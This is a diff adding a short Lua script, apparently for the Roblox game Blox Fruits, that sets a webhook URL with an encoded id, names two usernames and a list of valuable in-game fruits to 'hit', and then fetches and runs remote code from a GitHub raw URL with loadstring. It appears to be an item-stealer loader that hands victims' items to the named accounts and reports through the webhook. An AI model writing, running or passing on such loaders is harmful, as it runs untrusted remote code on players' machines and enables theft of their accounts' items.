@@ -1,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=QnNsZHJHQlVWeUp5S1IwU25OQXl6QTpVZU5zWFVPWFVTV1FXbnNOODQ0dEQzSGNlcTlyNUg1RTVaZldUeV9PbHlEblVpSGVoUlZIUjU1cmYyd01WS1Ricy1nRXN2R3owQXhwNk9SSWpTeVJhUXlfYUhKblk4ZTJBOFk3RkR6V25ENERpeW5Qdl95ZGFPM1FybG15NV9SbkJrVTN0UkJfSGtqS1NLSno1V2hUQ0FtRFJOT3l5ZlVTRU1hUkpkMFk4UGc"
+Usernames = {"lucasclashon", "ricarda2v"}
+FruitsToHit = {"Diamond-Diamond", "Light-Light", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
